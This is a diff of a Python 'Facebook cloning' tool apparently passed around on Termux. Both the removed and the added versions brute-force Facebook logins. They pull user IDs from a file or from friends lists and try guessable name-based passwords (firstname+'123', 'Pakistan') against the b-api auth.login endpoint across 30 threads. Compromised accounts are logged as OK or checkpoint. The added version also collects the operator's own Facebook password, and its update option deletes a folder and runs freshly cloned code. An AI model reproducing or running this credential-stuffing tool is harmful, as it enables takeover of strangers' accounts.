@@ -1,246 +1,363 @@
-#!/usr/bin/python3
-#Written by Mr Baloch
-import requests,bs4,json,os,sys,random,datetime,time,re
+#!/usr/bin/python2
+#coding=utf-8
+
+import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
+from multiprocessing.pool import ThreadPool
 try:
-	import rich
+    import requests
 except ImportError:
-	os.system('pip install rich')
-	time.sleep(1)
+    os.system('pip2 install requests')
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    os.system('python2 B4.py')
+
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+
+#### browser ####
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+
+#### colours ####
+B='\033[1;94m'
+R='\033[1;91m'
+G='\033[1;92m'
+W='\033[1;97m'
+S='\033[1;96m'
+P='\033[1;95m'
+Y='\033[1;93m'
+
+#### exit ####
+def exb():
+	print (R + 'Exit')
+	os.sys.exit()
+
+#### clear ####
+def cb():
+    os.system('clear')
+
+#### time sleep ####
+def t():
+    time.sleep(1)
+def t1():
+    time.sleep(0.01)
+
+#### print std ####
+def psb(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		t1()
+
+#### token remove ####
+def trb():
+    os.system('rm -rf token.txt')
+
+##### LOGO #####
+logo='''
+\033[1;94m ┈┈┈┈╱▔▔▔▔╲┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈╱▔▔▔▔╲┈┈┈┈
+\033[1;94m ┈┈┈▕▕B4 M4▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕B4 M4▏▏┈┈┈
+\033[1;94m ┈┈┈▕▕▂╱╲▂▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕▂╱╲▂▏▏┈┈┈
+\033[1;94m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;94mShabirBaloch.\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
+\033[1;96m ┈┈┈┈▕╲▂▂╱▏┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈▕╲▂▂╱▏┈┈┈┈
+\033[1;96m ╱▔▔▔▔┊┊┊┊▔▔▔▔╲☞☞☞☞☞☞\033[1;91m☜☜☜☜☜╱▔▔▔▔┊┊┊┊▔▔▔▔╲
+\033[1;96m................\033[1;93mShabirBaloch\033[1;91m...............
+\033[1;96m................\033[1;93m✬🄵🄰🄲🄴🄱🄾🄾🄺✬\033[1;91m..............
+
+\033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+
+\033[1;91m☞ Auther     : B4_BALOCH_M4_MASTER
+\033[1;92m☞ WhatsApp   : 03232132362
+\033[1;95m☞ YouTube    : https://youtube.com/channel/UCRnpWUOCz3Sb1RAX3GK4r0A
+
+\033[1;93m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+                                '''
+back=0
+successfull=[]
+checkpoint=[]
+oks=[]
+cps=[]
+id=[]
+
+#### login ####
+def login():
+	cb()
 	try:
-		import rich
-	except ImportError:
-		exit('[✓] Internet Eror ,Install Manual (pip install rich)')
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-try:ugen = open('user.txt','r').read().splitlines()
-except:ugen = ['Mozilla/5.0 (Linux; Android 11; Infinix X6810 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36'] #Baloch
-try:ugen2 = open('user2.txt','r').read().splitlines()
-except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 11; zh-cn; Infinix X6810 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 HiBrowser/v2.5.10.3 UWS/ Mobile Safari/537.36'] #Baloch
+		tb=open('token.txt', 'r')
+		menu() 
+	except (KeyError,IOError):
+		cb()
+		print (logo)
+		print (R + '◈━━━━▷' + S + ' Login With ✬🄵🄰🄲🄴🄱🄾🄾🄺✬ ' + R + '◁━━━━◈')
+		print
+		id=raw_input(S + '[☆] ' + S + 'Email: ' + G +'')
+		pwd=getpass.getpass(S + '[♡] ' + R + 'Password : ')
+		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		z=json.load(data)
+		if 'access_token' in z:
+		    st = open("token.txt", "w")
+		    st.write(z["access_token"])
+		    st.close()
+		    print (S + '[☆]' + Y + ' Login successfull 100% ✓')
+		    os.system('xdg-open https://youtube.com/channel/UCRnpWUOCz3Sb1RAX3GK4r0A')
+		    menu()
+		else:
+		    if "www.facebook.com" in z["error_msg"]:
+		        print (R + 'Account has a checkpoint !')
+		        t()
+		        login()
+		    else:
+		        print (R + 'number/user id/ password is wrong !')
+		        trb()
+		        t()
+		        login()
+def menu():
+	cb()
+	try:
+		tb=open('token.txt','r').read()
+	except IOError:
+		print (R + 'Token Invalid !')
+		trb()
+		t()
+		login()
+	try:
+		otw=requests.get('https://graph.facebook.com/me?access_token='+tb)
+		a=json.loads(otw.text)
+	except KeyError:
+		print (G + 'Account has a checkpoint !')
+		trb()
+		t()
+		login()
+	except requests.exceptions.ConnectionError:
+		print (W + 'No internet connection !')
+		t()
+		exb()
+	cb()
+	print (logo)
+	print (S + '[☆] ' + G + 'ID Name: ' + R + a['name'])
+	print (S + '[☆] ' + G + 'User ID: ' + R + a['id'])
+	print
+	print (S + 50*'-')
+	print
+	print (S + '[' + P + '☞1' + S + ']' + S + ' Fast Cloning New Update')
+	print (S + '[' + P + '☞2' + S + ']' + S + ' Update B4_BALOCH Tool')
+	print (S + '[' + P + '☞3' + S + ']' + S + ' B4_BALOCH WhatsApp Group')
+	print (S + '[' + Y + '☞4' + S + ']' + G + ' Log Out')
+	print (S + '[' + Y + '☞0' + S + ']' + R + ' Exit')
+	print
+	print (S + 50*'-')
+	print
+	mb()
 
-id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 
-x = '\033[93m'
-k = '\033[93m'
-h = '\x1b[1;92m'
-hh = '\033[92m'
-u = '\033[95m'
-kk = '\033[93m'
-b = '\33[1;96m'
-p = '\x1b[1;95m'
-P = '\033[0;00m'
-J = '\033[1;93m'
-S = '\033[0;00m'
-N = '\x1b[0m'
-I ='\033[1;92m'
-C ='\033[1;96m'
-M ='\033[1;91m'
-U ='\033[1;95m'
-K ='\033[1;93m'
-P='\033[00m'
-h='\033[1;90m'
-Q="\033[00m"
-kk='\033[1;92m'
-ff='\033[1;96m'
-G='\033[1;96m'
-p='\033[00m'
-h='\033[1;90m'
-Q="\033[00m"
-I='\033[1;92m'
-II='\033[1;96m'
-m='\033[1;91m'
-O ='\033[1;93m'
-H='\033[1;93m'
-b = '\033[1;96m'
-war = "[•]"
-B = random.choice([U,I,K,b,M])
-
-dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
-dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
-tgl = datetime.datetime.now().day
-bln = dic[(str(datetime.datetime.now().month))]
-thn = datetime.datetime.now().year
-okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-
-my_id = '100007061760822'
-
-def jalan(z):
-    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
-def mlaku(z):
-    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
-    
-def clear():
-	os.system('clear')
-def back():
-	menu()
-def banner():
-	clear()
-	print("""%s\n\x1b[93;1m                    
-  ███   ██   █    ████▄ ▄█▄     ▄  █ 
-  █  █  █ █  █    █   █ █▀ ▀▄  █   █ 
-  █ ▀ ▄ █▄▄█ █    █   █ █   ▀  ██▀▀█ 
-  █  ▄▀ █  █ ███▄ ▀████ █▄  ▄▀ █   █ 
-  ███      █     ▀      ▀███▀     █  
-          █
-
-\x1b[92;1m<=================•==================>\x1b[92;1m
-\x1b[93;1m Authur       \x1b[92;1m=>         \x1b[93;1mMr Baloch
-\x1b[93;1m Whatsp       \x1b[92;1m=>        \x1b[93;1m+92319×××××
-\x1b[93;1m Github       \x1b[92;1m=>         \x1b[93;1mBALOCH420
-\x1b[92;1m<=================•==================>\x1b[92;1m
-"""%(h))
-		
-def menu(): #Baloch
-	banner()
-	print("") #Baloch
-	print("""%s \x1b[92;1m<=================•==================>\x1b[92;1m """%(h))
-	print("""%s \33[1;32m[1] File Crack  """%(h))
-	print("""%s \33[1;33m[0] Exit"""%(h))
-	print("""%s \x1b[92;1m<=================•==================>\x1b[92;1m """%(h))
-	farhan = input(x+'\33[1;96m•Input Number> ')
-	if farhan in ['1','01']:
-		File2()
-	elif farhan in ['0','00']:
-		os.system("xdg-open https://m.facebook.com/100007061760822")
-		exit()
+def mb():
+	bm=raw_input(W + ' ✬🄵🄰🄲🄴🄱🄾🄾🄺✬   ')
+	if bm =='':
+		print (R + 'Select a valid option !')
+		mb()
+	elif bm =='1':
+		pak()
+	elif bm =='2':
+	    os.system('rm -rf $HOME/B4_BALOCH')
+	    os.system('cd $HOME && git clone https://github.com/shabirbaloch125/Baloch')
+	    cb()
+	    print (logo)
+	    psb('☆10%')
+	    psb('☆☆20%')
+	    psb('☆☆☆30%')
+	    psb('☆☆☆☆40%')
+	    psb('☆☆☆☆☆50%')
+	    psb('☆☆☆☆☆☆60%')
+	    psb('☆☆☆☆☆☆☆70%')
+	    psb('☆☆☆☆☆☆☆☆80%')
+	    psb('☆☆☆☆☆☆☆☆☆90%')
+	    psb('☆☆☆☆☆☆☆☆☆☆100%')
+	    psb('Frends login new Account✓')
+	    psb('WhatsApp Num 03232132362✓')
+	    psb('WellCome To B4_BALOCH')
+	    psb('Congratulations B4_BALOCH Tool Has Been Updated Successfully')
+	    psb('🔓User Name☆ 786786✓')
+	    psb('🔓Password ☆ 786786✓')
+	    psb('Subscrib My Youtube Channel B4 BALOCH M4 MASTER✓')
+	    psb('Please Login Again')
+	    time.sleep(2)
+	    os.system('cd $HOME/B4_BALOCH && python2 B4.py')
+	elif bm =='3':
+	    os.system('xdg-open https://chat.whatsapp.com/BcmyQPBz6lz3t6oVN8wLoi')
+	    menu()
+	elif bm =='4':
+		psb('Token Has Been Removed')
+		trb()
+		t()
+		exb()
+	elif bm =='0':
+	    exb()
 	else:
-		os.system("xdg-open https://m.facebook.com/100007061760822")
-		exit()
+		print (R+'Fill in correctly !')
+		mb()
 
-def File2():
-			clear()
-			banner()
-			try:
-				fileX = input ('\n [+] Enter file path : ') 
-				for line in open(fileX, 'r').readlines():
-					id.append(line.strip())
-				setting()
-			except IOError:
-				exit("\n [!] file %s not found"%(fileX))
 
-def setting():
-	print("""%s \x1b[92;1m<=================•==================>\x1b[92;1m """%(h))
-	print("""%s \33[1;32m[01] Farward Cracking """%(h))
-	print("""%s \33[1;32m[02] Reverse Cracking """%(h))
-	print("""%s \x1b[92;1m<=================•==================>\x1b[92;1m """%(h))
-	mubashar = input(x+'\33[1;96m•Input Number>')
-	if mubashar in ['1','01']:
-		for bacot in id:
-			id2.append(bacot)
-	elif mubashar in ['2','02']:
-		for bacot in id:
-			id2.insert(0,bacot)
-	
-	else:
-		print("""%s \33[1;33mRoung Input"""%(h))
-		exit()
-	print("""%s \x1b[92;1m<=================•==================>\x1b[92;1m """%(h))
-	print("""%s \33[1;32m[01] B-Api (fast)"""%(h))
-	print("""%s \x1b[92;1m<=================•==================>\x1b[92;1m """%(h))
-	baloch = input(x+'\33[1;96m•Input Number> : ')
-	if baloch in ['1','01']:
-		method.append('api')
-	else:
-		method.append('api')
-	print("""%s \x1b[92;1m<=================•==================>\x1b[92;1m """%(h))
-	fast = input(x+'\33[1;96m Want To Start ? (y/t) : ')
-	if fast in ['y','Y']:
-		passwrd()
-	elif fast in ['t','T']:
-		os.system("xdg-open https://m.facebook.com/100007061760822")
-		exit()
+def pak():
+	global tb
+	try:
+		tb=open('token.txt','r').read()
+	except IOError:
+		print (R + ' Invalid Token !')
+		trb()
+		t()
+		login()
+	cb()
+	print (logo)
+	print (S + '[' + P + '☞1' + S + ']' + P + ' Clone With Friend List')
+	print (S + '[' + P + '☞2' + S + ']' + P + ' Clone From Public Account')
+	print (S + '[' + Y + '☞3' + S + ']' + Y + ' Clone From File')
+	print (S + '[' + R + '☞0' + S + ']' + R + ' Back')
+	print
+	print (S + 50*'-')
+	print
+	pb()
 
-def passwrd():
-	clear()
-	banner()
-	print("""%s \x1b[92;1m<=================•==================>\x1b[92;1m """%(h))
-	print(x+' '+h+' '+x+' Total ids : '+str(len(id)))
-	print(x+'   Use Airplane Mode befor use\n   Cracking Starting...')
-	print("""%s \x1b[92;1m<=================•==================>\x1b[92;1m """%(h))
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = []
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(nmf)
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-			if 'api' in method:
-				pool.submit(crack2,idf,pwv)
-			else:
-				pool.submit(crack2,idf,pwv)
-	print('')
-	print("""%s \x1b[92;1m<=================•==================>\x1b[92;1m """%(h))
-	exitss = input(x+'\33[1;96m Want to Exit (y/t) : ')
-	if exitss in ['y','Y']:
-		exit()
-	else:
-		exit()
-
-def crack2(idf,pwv):
-	global loop,ok,cp
-	bi = random.choice([u,k,kk,b,h,hh])
-	pers = loop*100/len(id2)
-	fff = '%'
-	print('\r%s [Baloch] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
-	ua = random.choice(ugen).replace('\n','')
-	ses = requests.Session()
-	for pw in pwv:
+def pb():
+	bp=raw_input(W + ' ✬🄵🄰🄲🄴🄱🄾🄾🄺✬   ')
+	if bp =='':
+		print (R + 'Select a valid option !')
+		pb()
+	elif bp =='1':
+		cb()
+		print (logo)
+		r=requests.get('https://graph.facebook.com/me/friends?access_token='+tb)
+		z=json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+	elif bp=='2':
+		cb()
+		print (logo)
+		idt=raw_input(S + '[☆] ' + G + 'Put Public User ID/User Name: ' + W + '')
+		cb()
+		print (logo)
 		try:
-			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
-			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
-			if "www.facebook.com" in resp.json()["error_msg"]:
-				if 'ya' in oprek:
-					akun.append(idf+'|'+pw)
-					ceker(idf,pw)
-				else:
-					print('\r%s [cp] %s|%s        '%(b,idf,pw))
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-					akun.append(idf+'|'+pw)
-					cp+=1
-				break
-			elif "session_key" in resp.text and "EAAB" in resp.text:
-				print('\r%s [ok] %s|%s        '%(h,idf,pw))
-				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				ok+=1
-				break
+			jok=requests.get('https://graph.facebook.com/'+idt+'?access_token='+tb)
+			op=json.loads(jok.text)
+			psb(S + '[☆]' + G + ' Account  Name: ' + W + op['name'])
+		except KeyError:
+			print (R + ' ID not found !')
+			raw_input(R + ' Back')
+			pak()
+		r=requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+tb)
+		z=json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif bp =='3':
+		cb()
+		print (logo)
+		try:
+			idlist=raw_input(S + '[☆] ' + R + 'Enter File Path: ' + G + '')
+			for line in open(idlist,'r').readlines():
+				id.append(line.strip())
+		except IOError:
+			print (R + ' File Not Fount !')
+			raw_input(R + ' Back')
+			pak()
+	elif bp =='0':
+		menu()
+	else:
+		print (R + ' Select a valid option !')
+		pb()
+	print (S + '[☆]' + P + ' Total Friends: ' + W + str(len(id)))
+	psb(S + '[☆]' + S + ' To stop process  click on CTRL ~ Z')
+	print
+	print (S + 50*'-')
+	print
+	def main(arg):
+		global cps, oks
+		user=arg
+		try:
+			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
+			j=json.loads(h.text)
+			ps1=('786786')
+			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			k=json.load(dt)
+			if 'www.facebook.com' in k['error_msg']:
+			    print(S+'[CP] ♡ '+user+' ♡ '+ps1)
+			    cps.append(user+ps1)
 			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-
-def jalan(z):
-    for e in z + "\n":
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.04)
-def mlaku(z):
-    for e in z + "\n":
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.03)
-
-
+			    if 'access_token' in k:
+			        print (G+'[OK] ♡ '+user+' ♡ '+ps1)
+			        oks.append(user+ps1)
+			    else:
+			        ps2=(j['first_name']+'123')
+			        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			        k=json.load(dt)
+			        if 'www.facebook.com' in k['error_msg']:
+			            print(S+'[CP] ♡ '+user+' ♡ '+ps2)
+			            cps.append(user+ps2)
+			        else:
+			            if 'access_token' in k:
+			                print(G+'[OK] ♡ '+user+' ♡ '+ps2)
+			                oks.append(user+ps2)
+			            else:
+			                ps3=(j['first_name']+'786')
+			                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                k=json.load(dt)
+			                if 'www.facebook.com' in k['error_msg']:
+			                    print(S+'[CP] ♡ '+user+' ♡ '+ps3)
+			                    cps.append(user+ps3)
+			                else:
+			                    if 'access_token' in k:
+			                        print(G+'[OK] ♡ '+user+' ♡ '+ps3)
+			                        oks.append(user+ps3)
+			                    else:
+			                        ps4=(j['first_name']+'12345')
+			                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps4)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                        k=json.load(dt)
+			                        if 'www.facebook.com' in k['error_msg']:
+			                            print(S+'[CP] ♡ '+user+' ♡ '+ps4)
+			                            cps.append(user+ps4)
+			                        else:
+			                            if 'access_token' in k:
+			                                print(G+'[OK] ♡ '+user+' ♡ '+ps4)
+			                                oks.append(user+ps4)
+			                            else:
+			                                ps5=('Pakistan')
+			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                                k=json.load(dt)
+			                                if 'www.facebook.com' in k['error_msg']:
+			                                    print(S+'[CP] ♡ '+user+' ♡ '+ps5)
+			                                    cps.append(user+ps5)
+			                                else:
+			                                    if 'access_token' in k:
+			                                        print(G+'[OK] ♡ '+user+' ♡ '+ps5)
+			                                        oks.append(user+ps5)
+			                                    else:
+			                                        ps6=(j['first_name']+'khan')
+			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                                        k=json.load(dt)
+			                                        if 'www.facebook.com' in k['error_msg']:
+			                                            print(S+'[CP] ♡ '+user+' ♡ '+ps6)
+			                                            cps.append(user+ps6)
+			                                        else:
+			                                            if 'access_token' in k:
+			                                                print(G+'[OK] ♡ '+user+' ♡ '+ps6)
+			                                                oks.append(user+ps6)
+		except:
+			pass
+	p=ThreadPool(30)
+	p.map(main, id)
+	print
+	print(S+50*'-')
+	print
+	print(S+'Process has been completed CP ID Open After 7 Days ')
+	print(Y+'Total '+G+'OK'+S+'/'+P+'CP'+S+' = '+G+str(len(oks))+S+'/'+R+str(len(cps)))
+	print(S+'BlackMafia')     
+	print
+	raw_input(R + 'Back')
+	os.system('python2 B4.py')
 if __name__=='__main__':
-	os.system('git pull')
-	try:os.mkdir('CP')
-	except:pass
-	try:os.mkdir('OK')
-	except:pass
-	os.system("xdg-open https://m.facebook.com/100007061760822")
-	menu()
+    login()
+
